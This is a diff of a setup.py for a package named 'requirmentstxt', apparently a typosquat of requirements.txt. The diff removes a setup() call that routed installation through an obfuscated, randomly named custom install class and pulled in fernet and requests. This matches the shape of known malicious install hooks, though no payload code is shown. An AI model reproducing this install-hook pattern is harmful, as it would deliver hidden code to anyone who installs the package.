@@ -18,22 +18,5 @@ class PvpaRMKCsiXObvGVymxAdoouBcZQCouBEjnwexHVsRHDbDYGaQfySrcSgmxGknwklZOzeoVtVl
             install.run(self)
 
 
-setup(
-    name="requirmentstxt",
-    version=VERSION,
-    author="cJEaGI",
-    author_email="vgTfq@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': PvpaRMKCsiXObvGVymxAdoouBcZQCouBEjnwexHVsRHDbDYGaQfySrcSgmxGknwklZOzeoVtVltpluHgMnSENpFKdnGWHXKcimTvDQCckoSUPSCkFMsiAXEcwOVdUaOulJ,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
 
